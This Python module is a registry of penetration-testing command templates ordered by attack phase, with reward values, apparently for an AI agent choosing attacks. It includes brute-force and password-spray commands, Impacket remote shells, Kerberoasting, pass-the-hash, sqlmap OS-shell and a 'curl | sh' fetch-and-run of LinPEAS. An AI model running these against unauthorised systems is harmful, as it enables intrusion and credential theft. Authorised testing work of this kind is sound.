"""
Command Registry - Comprehensive pentesting commands organized by attack phase.

This module provides a structured registry of 100+ real pentesting commands
with proper parameters, preconditions, and success indicators. Commands are
organized by attack phase and only become valid when preconditions are met.
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Dict, List, Optional, Set, Any, Callable


class AttackPhase(Enum):
    """Phases of a penetration test attack chain."""
    RECON = auto()           # Initial reconnaissance and discovery
    ENUMERATION = auto()     # Detailed service/user enumeration
    EXPLOITATION = auto()    # Initial access attempts
    PRIVILEGE_ESCALATION = auto()  # Escalate from low to high privileges
    LATERAL_MOVEMENT = auto()      # Move between systems
    EXFILTRATION = auto()          # Data extraction and persistence
    POST_EXPLOITATION = auto()     # Cleanup, persistence, covering tracks


@dataclass
class CommandTemplate:
    """
    Template for a pentesting command with parameters and context.
    
    Attributes:
        name: Unique identifier for the command
        template: Command string with {param} placeholders
        description: What this command does and when to use it
        phase: Which attack phase this belongs to
        required_params: Parameters that must be provided
        optional_params: Parameters that can be omitted (with defaults)
        preconditions: Set of state flags that must be true to use this command
        success_indicators: Patterns in output that indicate success
        typical_reward: Expected reward when successful
        tags: Categories for grouping (e.g., "smb", "web", "linux")
        
        # NEW - WHY/WHEN documentation for GPT understanding
        why: Why this command is useful (strategic value)
        when: When to use this command (conditions/context)
        not_when: When NOT to use this command (contraindications)
        follows_after: Commands that should typically precede this one
        enables: What new capabilities this command enables if successful
    """
    name: str
    template: str
    description: str
    phase: AttackPhase
    required_params: List[str] = field(default_factory=list)
    optional_params: Dict[str, str] = field(default_factory=dict)
    preconditions: Set[str] = field(default_factory=set)
    success_indicators: List[str] = field(default_factory=list)
    typical_reward: float = 1.0
    tags: Set[str] = field(default_factory=set)
    
    # WHY/WHEN documentation for intelligent command selection
    why: str = ""  # Strategic value (e.g., "Discovers open ports for further enumeration")
    when: str = ""  # Usage conditions (e.g., "First step when targeting a new host")
    not_when: str = ""  # Contraindications (e.g., "Avoid if stealth is critical - easily detected")
    follows_after: List[str] = field(default_factory=list)  # Typical predecessors
    enables: List[str] = field(default_factory=list)  # What this unlocks
    
    def get_usage_context(self) -> str:
        """Get a formatted string describing when/why to use this command."""
        parts = [self.description]
        if self.why:
            parts.append(f"WHY: {self.why}")
        if self.when:
            parts.append(f"WHEN: {self.when}")
        if self.not_when:
            parts.append(f"AVOID WHEN: {self.not_when}")
        if self.follows_after:
            parts.append(f"FOLLOWS: {', '.join(self.follows_after)}")
        if self.enables:
            parts.append(f"ENABLES: {', '.join(self.enables)}")
        return " | ".join(parts)


@dataclass
class CommandChoice:
    """
    A specific command chosen by the agent with filled parameters.
    
    Attributes:
        template_name: Name of the CommandTemplate used
        params: Dictionary of parameter values
        reasoning: Why this command was chosen (for learning)
        confidence: Agent's confidence in this choice (0-1)
        phase: The attack phase this command belongs to
    """
    template_name: str
    params: Dict[str, str]
    reasoning: str
    confidence: float
    phase: AttackPhase


# =============================================================================
# COMPREHENSIVE COMMAND REGISTRY
# =============================================================================

COMMAND_REGISTRY: Dict[str, CommandTemplate] = {}


def register(template: CommandTemplate) -> CommandTemplate:
    """Register a command template in the registry."""
    COMMAND_REGISTRY[template.name] = template
    return template


# =============================================================================
# PHASE 1: RECONNAISSANCE
# =============================================================================

# --- Network Discovery ---
register(CommandTemplate(
    name="nmap_quick_scan",
    template="nmap -sn {target_range}",
    description="Quick ping sweep to discover live hosts. Use first to find targets.",
    phase=AttackPhase.RECON,
    required_params=["target_range"],
    success_indicators=["Host is up", "hosts up"],
    typical_reward=0.5,
    tags={"network", "discovery"},
    # WHY/WHEN documentation
    why="Discovers which hosts are alive before deeper scanning - saves time and reduces noise",
    when="First step when targeting a network range. Run before port scanning.",
    not_when="If you already know the target IP. Avoid on stealth-critical engagements - ICMP is easily detected.",
    follows_after=[],
    enables=["nmap_top_ports", "nmap_full_tcp", "masscan_fast"],
))

register(CommandTemplate(
    name="nmap_top_ports",
    template="nmap -sT --top-ports {num_ports} {target}",
    description="Scan top N most common ports. Good balance of speed and coverage.",
    phase=AttackPhase.RECON,
    required_params=["target", "num_ports"],
    optional_params={"num_ports": "100"},
    success_indicators=["open", "filtered"],
    typical_reward=1.0,
    tags={"network", "ports"},
    why="Quickly finds common services like HTTP, SSH, SMB without scanning all 65535 ports",
    when="After confirming a host is alive. Good for initial triage.",
    not_when="If you need thorough coverage of ALL ports - use nmap_full_tcp instead.",
    follows_after=["nmap_quick_scan"],
    enables=["nmap_service_version", "gobuster_dir", "smb_enum", "ftp_enum"],
))

register(CommandTemplate(
    name="nmap_full_tcp",
    template="nmap -sT -p- --min-rate {rate} {target}",
    description="Full TCP port scan. Slow but thorough - finds non-standard ports.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    optional_params={"rate": "5000"},
    success_indicators=["open"],
    typical_reward=1.5,
    tags={"network", "ports", "thorough"},
    why="Finds services on non-standard ports that top-ports might miss (e.g., hidden web apps on port 8080, 9000, etc.)",
    when="After top-ports scan. Essential when initial enumeration doesn't reveal obvious attack vectors.",
    not_when="Time-critical situations - takes minutes to hours. May trigger IDS/IPS.",
    follows_after=["nmap_quick_scan", "nmap_top_ports"],
    enables=["nmap_service_version", "specific_service_enumeration"],
))

register(CommandTemplate(
    name="nmap_service_version",
    template="nmap -sV -sC -p {ports} {target}",
    description="Version detection and default scripts on specific ports. Use after finding open ports.",
    phase=AttackPhase.RECON,
    required_params=["target", "ports"],
    preconditions={"ports_discovered"},
    success_indicators=["VERSION", "Service Info"],
    typical_reward=2.0,
    tags={"network", "enumeration", "versions"},
    why="Identifies exact service versions for CVE lookup. Default scripts often reveal useful info (hostnames, shares, etc.)",
    when="CRITICAL: Run on every discovered open port. Version info drives exploitation strategy.",
    not_when="On ports you've already versioned. Avoid with -sC on production systems (scripts can cause issues).",
    follows_after=["nmap_top_ports", "nmap_full_tcp"],
    enables=["searchsploit", "metasploit_search", "specific_exploits"],
))

register(CommandTemplate(
    name="nmap_vuln_scan",
    template="nmap --script vuln -p {ports} {target}",
    description="Run vulnerability scanning scripts. Use after version detection.",
    phase=AttackPhase.RECON,
    required_params=["target", "ports"],
    preconditions={"services_enumerated"},
    success_indicators=["VULNERABLE", "CVE-"],
    typical_reward=3.0,
    tags={"network", "vulnerability"},
    why="Automatically tests for known CVEs like EternalBlue, Heartbleed. High reward for confirmed vulns.",
    when="After version detection reveals potentially vulnerable services. Focus on interesting ports.",
    not_when="Early recon (need versions first). Very noisy - IDS will definitely see this.",
    follows_after=["nmap_service_version"],
    enables=["metasploit_exploit", "manual_exploit"],
))

register(CommandTemplate(
    name="nmap_udp_scan",
    template="nmap -sU --top-ports {num_ports} {target}",
    description="UDP port scan. Slow but finds SNMP, DNS, TFTP, NTP services.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    optional_params={"num_ports": "50"},
    success_indicators=["open", "open|filtered"],
    typical_reward=1.5,
    tags={"network", "udp"}
))

register(CommandTemplate(
    name="masscan_fast",
    template="masscan {target_range} -p {ports} --rate {rate}",
    description="Ultra-fast port scanner. Use for large network ranges.",
    phase=AttackPhase.RECON,
    required_params=["target_range", "ports"],
    optional_params={"rate": "10000"},
    success_indicators=["Discovered open port"],
    typical_reward=1.0,
    tags={"network", "fast"}
))

register(CommandTemplate(
    name="nmap_os_detection",
    template="nmap -O -sV {target}",
    description="OS fingerprinting. Helps identify Windows vs Linux targets.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["OS details", "Running:"],
    typical_reward=1.5,
    tags={"network", "os"}
))

# --- Web Discovery ---
register(CommandTemplate(
    name="whatweb",
    template="whatweb -a 3 {url}",
    description="Identify web technologies, CMS, frameworks. First step for web targets.",
    phase=AttackPhase.RECON,
    required_params=["url"],
    preconditions={"http_service_found"},
    success_indicators=["WordPress", "Apache", "nginx", "PHP"],
    typical_reward=1.0,
    tags={"web", "fingerprint"}
))

register(CommandTemplate(
    name="curl_headers",
    template="curl -I -s {url}",
    description="Fetch HTTP headers. Reveals server info, security headers.",
    phase=AttackPhase.RECON,
    required_params=["url"],
    preconditions={"http_service_found"},
    success_indicators=["Server:", "X-Powered-By"],
    typical_reward=0.5,
    tags={"web", "headers"}
))

# =============================================================================
# PHASE 2: ENUMERATION
# =============================================================================

# --- Web Enumeration ---
register(CommandTemplate(
    name="gobuster_dir",
    template="gobuster dir -u {url} -w {wordlist} -x {extensions} -t {threads}",
    description="Directory and file brute-forcing. Essential for web targets.",
    phase=AttackPhase.ENUMERATION,
    required_params=["url"],
    optional_params={
        "wordlist": "/usr/share/wordlists/dirb/common.txt",
        "extensions": "php,html,txt,bak",
        "threads": "50"
    },
    preconditions={"http_service_found"},
    success_indicators=["Status: 200", "Status: 301", "Status: 302"],
    typical_reward=2.0,
    tags={"web", "bruteforce", "directories"}
))

register(CommandTemplate(
    name="gobuster_vhost",
    template="gobuster vhost -u {url} -w {wordlist} --append-domain",
    description="Virtual host discovery. Find hidden subdomains on same IP.",
    phase=AttackPhase.ENUMERATION,
    required_params=["url"],
    optional_params={"wordlist": "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"},
    preconditions={"http_service_found"},
    success_indicators=["Found:"],
    typical_reward=2.5,
    tags={"web", "vhost", "subdomain"}
))

register(CommandTemplate(
    name="ffuf_fuzz",
    template="ffuf -u {url}/FUZZ -w {wordlist} -mc {match_codes} -t {threads}",
    description="Fast web fuzzer. Use for directory/file discovery or parameter fuzzing.",
    phase=AttackPhase.ENUMERATION,
    required_params=["url"],
    optional_params={
        "wordlist": "/usr/share/wordlists/dirb/common.txt",
        "match_codes": "200,301,302,401,403",
        "threads": "50"
    },
    preconditions={"http_service_found"},
    success_indicators=["Status: 200", "[Status:"],
    typical_reward=2.0,
    tags={"web", "fuzzing"}
))

register(CommandTemplate(
    name="nikto_scan",
    template="nikto -h {url} -C all",
    description="Web vulnerability scanner. Finds common misconfigs and vulns.",
    phase=AttackPhase.ENUMERATION,
    required_params=["url"],
    preconditions={"http_service_found"},
    success_indicators=["OSVDB-", "+ /", "vulnerab"],
    typical_reward=2.0,
    tags={"web", "vulnerability"}
))

register(CommandTemplate(
    name="wfuzz_params",
    template="wfuzz -c -z file,{wordlist} -d '{post_data}' --hc 404 {url}",
    description="Parameter fuzzing for forms. Find hidden parameters.",
    phase=AttackPhase.ENUMERATION,
    required_params=["url", "post_data"],
    optional_params={"wordlist": "/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt"},
    preconditions={"http_service_found", "form_found"},
    success_indicators=["C=200", "C=302"],
    typical_reward=2.0,
    tags={"web", "fuzzing", "parameters"}
))

register(CommandTemplate(
    name="feroxbuster",
    template="feroxbuster -u {url} -w {wordlist} -x {extensions} --depth {depth}",
    description="Recursive content discovery. Better than gobuster for deep sites.",
    phase=AttackPhase.ENUMERATION,
    required_params=["url"],
    optional_params={
        "wordlist": "/usr/share/wordlists/dirb/common.txt",
        "extensions": "php,html,txt",
        "depth": "3"
    },
    preconditions={"http_service_found"},
    success_indicators=["200", "301"],
    typical_reward=2.0,
    tags={"web", "directories", "recursive"}
))

# --- SMB Enumeration ---
register(CommandTemplate(
    name="smbclient_list",
    template="smbclient -L //{target} -N",
    description="List SMB shares anonymously. First step for SMB.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"smb_service_found"},
    success_indicators=["Sharename", "IPC$", "Disk"],
    typical_reward=1.5,
    tags={"smb", "shares"}
))

register(CommandTemplate(
    name="smbclient_connect",
    template="smbclient //{target}/{share} -N",
    description="Connect to SMB share anonymously. Look for sensitive files.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "share"],
    preconditions={"smb_service_found", "share_discovered"},
    success_indicators=["smb:", "Try \"help\""],
    typical_reward=2.0,
    tags={"smb", "access"}
))

register(CommandTemplate(
    name="smbclient_auth",
    template="smbclient //{target}/{share} -U {username}%{password}",
    description="Connect to SMB share with credentials.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "share", "username", "password"],
    preconditions={"smb_service_found", "credentials_known"},
    success_indicators=["smb:", "Try \"help\""],
    typical_reward=2.5,
    tags={"smb", "authenticated"}
))

register(CommandTemplate(
    name="smbmap_shares",
    template="smbmap -H {target} -u {username} -p {password}",
    description="Enumerate SMB share permissions. Shows read/write access.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    optional_params={"username": "guest", "password": ""},
    preconditions={"smb_service_found"},
    success_indicators=["READ", "WRITE", "Disk"],
    typical_reward=2.0,
    tags={"smb", "permissions"}
))

register(CommandTemplate(
    name="enum4linux_full",
    template="enum4linux -a {target}",
    description="Full SMB/NetBIOS enumeration. Gets users, shares, policies.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"smb_service_found"},
    success_indicators=["user:", "group:", "share:"],
    typical_reward=3.0,
    tags={"smb", "users", "comprehensive"}
))

register(CommandTemplate(
    name="enum4linux_ng",
    template="enum4linux-ng -A {target}",
    description="Modern enum4linux. Better parsing and output.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"smb_service_found"},
    success_indicators=["Users:", "Groups:", "Shares:"],
    typical_reward=3.0,
    tags={"smb", "modern"}
))

# --- LDAP Enumeration ---
register(CommandTemplate(
    name="ldapsearch_base",
    template="ldapsearch -x -H ldap://{target} -b '{base_dn}'",
    description="Query LDAP anonymously. Get domain info.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "base_dn"],
    preconditions={"ldap_service_found"},
    success_indicators=["dn:", "objectClass"],
    typical_reward=2.0,
    tags={"ldap", "domain"}
))

register(CommandTemplate(
    name="ldapsearch_users",
    template="ldapsearch -x -H ldap://{target} -b '{base_dn}' '(objectClass=user)' sAMAccountName",
    description="Enumerate domain users via LDAP.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "base_dn"],
    preconditions={"ldap_service_found"},
    success_indicators=["sAMAccountName:", "dn:"],
    typical_reward=2.5,
    tags={"ldap", "users"}
))

register(CommandTemplate(
    name="windapsearch",
    template="windapsearch -d {domain} --dc-ip {target} -U",
    description="Enumerate AD users via LDAP. Clean output.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "domain"],
    preconditions={"ldap_service_found"},
    success_indicators=["sAMAccountName", "cn:"],
    typical_reward=2.5,
    tags={"ldap", "ad", "users"}
))

# --- DNS Enumeration ---
register(CommandTemplate(
    name="dig_any",
    template="dig ANY @{target} {domain}",
    description="Query all DNS records. Get subdomains, mail servers.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "domain"],
    preconditions={"dns_service_found"},
    success_indicators=["ANSWER SECTION", "A ", "MX "],
    typical_reward=1.5,
    tags={"dns", "records"}
))

register(CommandTemplate(
    name="dig_axfr",
    template="dig AXFR @{target} {domain}",
    description="Attempt DNS zone transfer. Reveals all records if misconfigured.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "domain"],
    preconditions={"dns_service_found"},
    success_indicators=["XFR size", "ANSWER:"],
    typical_reward=4.0,
    tags={"dns", "zone_transfer"}
))

register(CommandTemplate(
    name="dnsrecon",
    template="dnsrecon -d {domain} -n {target} -t std",
    description="Comprehensive DNS enumeration. Multiple query types.",
    phase=AttackPhase.ENUMERATION,
    required_params=["domain", "target"],
    preconditions={"dns_service_found"},
    success_indicators=["[*] ", "A ", "NS "],
    typical_reward=2.0,
    tags={"dns", "comprehensive"}
))

# --- SSH Enumeration ---
register(CommandTemplate(
    name="ssh_audit",
    template="ssh-audit {target}",
    description="Audit SSH configuration. Find weak algorithms and vulns.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"ssh_service_found"},
    success_indicators=["(rec)", "(warn)", "vulnerability"],
    typical_reward=1.5,
    tags={"ssh", "audit"}
))

# --- SNMP Enumeration ---
register(CommandTemplate(
    name="snmpwalk",
    template="snmpwalk -c {community} -v {version} {target}",
    description="Walk SNMP tree. Reveals system info, interfaces, processes.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    optional_params={"community": "public", "version": "2c"},
    preconditions={"snmp_service_found"},
    success_indicators=["STRING:", "INTEGER:", "iso."],
    typical_reward=3.0,
    tags={"snmp", "information"}
))

register(CommandTemplate(
    name="onesixtyone",
    template="onesixtyone -c {wordlist} {target}",
    description="SNMP community string brute-force.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    optional_params={"wordlist": "/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"},
    preconditions={"snmp_service_found"},
    success_indicators=["[public]", "[private]"],
    typical_reward=2.5,
    tags={"snmp", "bruteforce"}
))

# --- NFS Enumeration ---
register(CommandTemplate(
    name="showmount",
    template="showmount -e {target}",
    description="Show NFS exports. Find mountable shares.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"nfs_service_found"},
    success_indicators=["Export list", "/"],
    typical_reward=2.0,
    tags={"nfs", "shares"}
))

register(CommandTemplate(
    name="nfs_mount",
    template="mount -t nfs {target}:{export} {mountpoint}",
    description="Mount NFS share locally.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "export", "mountpoint"],
    preconditions={"nfs_service_found", "nfs_export_found"},
    success_indicators=["mounted"],
    typical_reward=3.0,
    tags={"nfs", "mount"}
))

# --- RPC Enumeration ---
register(CommandTemplate(
    name="rpcclient_null",
    template="rpcclient -U '' -N {target}",
    description="Connect with null session. Enumerate users/groups.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"smb_service_found"},
    success_indicators=["rpcclient $>"],
    typical_reward=2.0,
    tags={"rpc", "null_session"}
))

register(CommandTemplate(
    name="rpcclient_enumdomusers",
    template="rpcclient -U '' -N {target} -c 'enumdomusers'",
    description="Enumerate domain users via RPC.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"smb_service_found", "null_session_allowed"},
    success_indicators=["user:", "rid:"],
    typical_reward=2.5,
    tags={"rpc", "users"}
))

# --- FTP Enumeration ---
register(CommandTemplate(
    name="ftp_anonymous",
    template="ftp -n {target} <<< $'user anonymous\\npass\\nls -la\\nbye'",
    description="Test FTP anonymous access and list files.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"ftp_service_found"},
    success_indicators=["230", "drwx", "-rw"],
    typical_reward=2.0,
    tags={"ftp", "anonymous"}
))

# =============================================================================
# PHASE 3: EXPLOITATION
# =============================================================================

# --- Password Attacks ---
register(CommandTemplate(
    name="hydra_ssh",
    template="hydra -L {userlist} -P {passlist} {target} ssh -t 4",
    description="SSH brute-force. Use small wordlists first.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "userlist", "passlist"],
    preconditions={"ssh_service_found", "usernames_known"},
    success_indicators=["login:", "[22]"],
    typical_reward=5.0,
    tags={"bruteforce", "ssh", "passwords"},
    why="Direct access if password is weak. SSH shell gives full interactive control.",
    when="Have discovered usernames AND SSH is open. Start with targeted wordlists.",
    not_when="SSH not found. No usernames known. Account lockout enabled (check first).",
    follows_after=["nmap_service_version", "smb_enum", "ldap_user_enum"],
    enables=["shell_access", "privilege_escalation"],
))

register(CommandTemplate(
    name="hydra_ftp",
    template="hydra -L {userlist} -P {passlist} {target} ftp -t 4",
    description="FTP brute-force attack.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "userlist", "passlist"],
    preconditions={"ftp_service_found"},
    success_indicators=["login:", "[21]"],
    typical_reward=5.0,
    tags={"bruteforce", "ftp", "passwords"},
    why="FTP often has weak passwords. May provide file access to upload shells.",
    when="FTP service found. Try anonymous first before brute-forcing!",
    not_when="Anonymous FTP already works. Very slow with large wordlists.",
    follows_after=["ftp_enum", "nmap_service_version"],
    enables=["file_upload", "webshell_upload", "credential_discovery"],
))

register(CommandTemplate(
    name="hydra_smb",
    template="hydra -L {userlist} -P {passlist} {target} smb -t 4",
    description="SMB brute-force attack.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "userlist", "passlist"],
    preconditions={"smb_service_found"},
    success_indicators=["login:", "[445]"],
    typical_reward=5.0,
    tags={"bruteforce", "smb", "passwords"}
))

register(CommandTemplate(
    name="hydra_http_form",
    template='hydra -L {userlist} -P {passlist} {target} http-post-form "{form_path}:{form_data}:{fail_string}" -t 16',
    description="HTTP form brute-force. Need to identify form params first.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "userlist", "passlist", "form_path", "form_data", "fail_string"],
    preconditions={"http_service_found", "login_form_found"},
    success_indicators=["login:", "[80]", "[443]"],
    typical_reward=5.0,
    tags={"bruteforce", "web", "passwords"}
))

register(CommandTemplate(
    name="crackmapexec_smb_bruteforce",
    template="crackmapexec smb {target} -u {userlist} -p {passlist} --continue-on-success",
    description="SMB password spraying. Tests multiple creds efficiently.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "userlist", "passlist"],
    preconditions={"smb_service_found"},
    success_indicators=["[+]", "Pwn3d!"],
    typical_reward=5.0,
    tags={"bruteforce", "smb", "spray"}
))

register(CommandTemplate(
    name="crackmapexec_winrm",
    template="crackmapexec winrm {target} -u {username} -p {password}",
    description="Test WinRM credentials. Can get shell if successful.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "password"],
    preconditions={"winrm_service_found", "credentials_known"},
    success_indicators=["[+]", "Pwn3d!"],
    typical_reward=5.0,
    tags={"winrm", "authentication"}
))

# --- Impacket Suite ---
register(CommandTemplate(
    name="impacket_psexec",
    template="impacket-psexec {domain}/{username}:{password}@{target}",
    description="PsExec-style shell. Requires admin credentials.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "password"],
    optional_params={"domain": "."},
    preconditions={"smb_service_found", "admin_credentials_known"},
    success_indicators=["Microsoft Windows", "C:\\Windows"],
    typical_reward=10.0,
    tags={"impacket", "shell", "admin"}
))

register(CommandTemplate(
    name="impacket_wmiexec",
    template="impacket-wmiexec {domain}/{username}:{password}@{target}",
    description="WMI-based shell. More stealthy than PsExec.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "password"],
    optional_params={"domain": "."},
    preconditions={"smb_service_found", "admin_credentials_known"},
    success_indicators=["Microsoft Windows", "C:\\"],
    typical_reward=10.0,
    tags={"impacket", "shell", "wmi"}
))

register(CommandTemplate(
    name="impacket_smbexec",
    template="impacket-smbexec {domain}/{username}:{password}@{target}",
    description="SMB-based shell. Alternative to PsExec.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "password"],
    optional_params={"domain": "."},
    preconditions={"smb_service_found", "admin_credentials_known"},
    success_indicators=["Microsoft Windows", "C:\\"],
    typical_reward=10.0,
    tags={"impacket", "shell", "smb"}
))

register(CommandTemplate(
    name="impacket_GetNPUsers",
    template="impacket-GetNPUsers {domain}/ -usersfile {userlist} -dc-ip {target} -format hashcat",
    description="AS-REP Roasting. Get hashes for users without preauth.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "domain", "userlist"],
    preconditions={"kerberos_service_found", "usernames_known"},
    success_indicators=["$krb5asrep$", "hash"],
    typical_reward=6.0,
    tags={"impacket", "kerberos", "asrep"}
))

register(CommandTemplate(
    name="impacket_GetUserSPNs",
    template="impacket-GetUserSPNs {domain}/{username}:{password} -dc-ip {target} -request",
    description="Kerberoasting. Get TGS hashes for service accounts.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "domain", "username", "password"],
    preconditions={"kerberos_service_found", "credentials_known"},
    success_indicators=["$krb5tgs$", "ServicePrincipalName"],
    typical_reward=6.0,
    tags={"impacket", "kerberos", "kerberoast"}
))

# --- Web Exploitation ---
register(CommandTemplate(
    name="sqlmap_get",
    template="sqlmap -u '{url}' --batch --dbs",
    description="SQL injection on GET parameter. Auto-detects and exploits.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["url"],
    preconditions={"http_service_found", "sqli_suspected"},
    success_indicators=["available databases", "fetching", "Parameter:"],
    typical_reward=8.0,
    tags={"web", "sqli"}
))

register(CommandTemplate(
    name="sqlmap_post",
    template="sqlmap -u '{url}' --data '{post_data}' --batch --dbs",
    description="SQL injection on POST data.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["url", "post_data"],
    preconditions={"http_service_found", "sqli_suspected"},
    success_indicators=["available databases", "fetching"],
    typical_reward=8.0,
    tags={"web", "sqli", "post"}
))

register(CommandTemplate(
    name="sqlmap_shell",
    template="sqlmap -u '{url}' --os-shell",
    description="Get OS shell via SQL injection. Requires write access.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["url"],
    preconditions={"sqli_confirmed"},
    success_indicators=["os-shell>", "command execution"],
    typical_reward=10.0,
    tags={"web", "sqli", "shell"}
))

# --- Evil-WinRM ---
register(CommandTemplate(
    name="evil_winrm",
    template="evil-winrm -i {target} -u {username} -p {password}",
    description="WinRM shell. Excellent for Windows remote access.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "password"],
    preconditions={"winrm_service_found", "credentials_known"},
    success_indicators=["Evil-WinRM", "PS ", "*Evil-WinRM*"],
    typical_reward=10.0,
    tags={"winrm", "shell", "windows"}
))

register(CommandTemplate(
    name="evil_winrm_hash",
    template="evil-winrm -i {target} -u {username} -H {hash}",
    description="WinRM with NTLM hash (pass-the-hash).",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "hash"],
    preconditions={"winrm_service_found", "hash_known"},
    success_indicators=["Evil-WinRM", "PS "],
    typical_reward=10.0,
    tags={"winrm", "pth", "shell"}
))

# --- SSH Access ---
register(CommandTemplate(
    name="ssh_login",
    template="ssh {username}@{target}",
    description="SSH login with credentials.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username"],
    preconditions={"ssh_service_found", "credentials_known"},
    success_indicators=["$", "#", "Welcome", "Last login"],
    typical_reward=10.0,
    tags={"ssh", "shell"}
))

register(CommandTemplate(
    name="ssh_key_login",
    template="ssh -i {keyfile} {username}@{target}",
    description="SSH login with private key.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "keyfile"],
    preconditions={"ssh_service_found", "ssh_key_found"},
    success_indicators=["$", "#", "Welcome"],
    typical_reward=10.0,
    tags={"ssh", "key", "shell"}
))

# --- Port Knocking ---
register(CommandTemplate(
    name="knock",
    template="knock {target} {ports}",
    description="Port knocking sequence to open hidden ports.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "ports"],
    preconditions={"port_knock_sequence_known"},
    success_indicators=[""],
    typical_reward=3.0,
    tags={"portknock", "evasion"}
))

register(CommandTemplate(
    name="nmap_port_knock",
    template="for port in {ports}; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port {target}; done",
    description="Port knocking using nmap. Use when knock command unavailable.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "ports"],
    preconditions={"port_knock_sequence_known"},
    success_indicators=[""],
    typical_reward=3.0,
    tags={"portknock", "nmap"}
))

# =============================================================================
# PHASE 4: PRIVILEGE ESCALATION
# =============================================================================

# --- Linux PrivEsc ---
register(CommandTemplate(
    name="linpeas",
    template="curl -L {url} | sh",
    description="LinPEAS - comprehensive Linux privilege escalation checker.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    optional_params={"url": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"},
    preconditions={"linux_shell_obtained"},
    success_indicators=["95%", "Vulnerable", "CVE-"],
    typical_reward=3.0,
    tags={"linux", "privesc", "enumeration"}
))

register(CommandTemplate(
    name="linpeas_local",
    template="./linpeas.sh",
    description="Run LinPEAS from local copy.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"linux_shell_obtained", "linpeas_uploaded"},
    success_indicators=["95%", "Vulnerable"],
    typical_reward=3.0,
    tags={"linux", "privesc"}
))

register(CommandTemplate(
    name="sudo_list",
    template="sudo -l",
    description="List sudo privileges. Essential first step.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"linux_shell_obtained"},
    success_indicators=["NOPASSWD", "ALL", "(root)"],
    typical_reward=2.0,
    tags={"linux", "sudo"}
))

register(CommandTemplate(
    name="find_suid",
    template="find / -perm -4000 -type f 2>/dev/null",
    description="Find SUID binaries. Look for GTFOBins entries.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"linux_shell_obtained"},
    success_indicators=["/usr/bin/", "/usr/local/"],
    typical_reward=2.0,
    tags={"linux", "suid"}
))

register(CommandTemplate(
    name="find_capabilities",
    template="getcap -r / 2>/dev/null",
    description="Find binaries with Linux capabilities.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"linux_shell_obtained"},
    success_indicators=["cap_", "=ep"],
    typical_reward=2.0,
    tags={"linux", "capabilities"}
))

register(CommandTemplate(
    name="find_writable_etc",
    template="find /etc -writable -type f 2>/dev/null",
    description="Find writable config files. passwd, shadow, sudoers?",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"linux_shell_obtained"},
    success_indicators=["/etc/passwd", "/etc/shadow", "/etc/sudoers"],
    typical_reward=3.0,
    tags={"linux", "writable"}
))

register(CommandTemplate(
    name="pspy",
    template="./pspy64",
    description="Monitor processes without root. Find cron jobs, scripts.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"linux_shell_obtained", "pspy_uploaded"},
    success_indicators=["CMD:", "UID=0"],
    typical_reward=2.5,
    tags={"linux", "process", "cron"}
))

register(CommandTemplate(
    name="kernel_exploit_check",
    template="uname -a && cat /etc/*release",
    description="Get kernel version and distro for exploit research.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"linux_shell_obtained"},
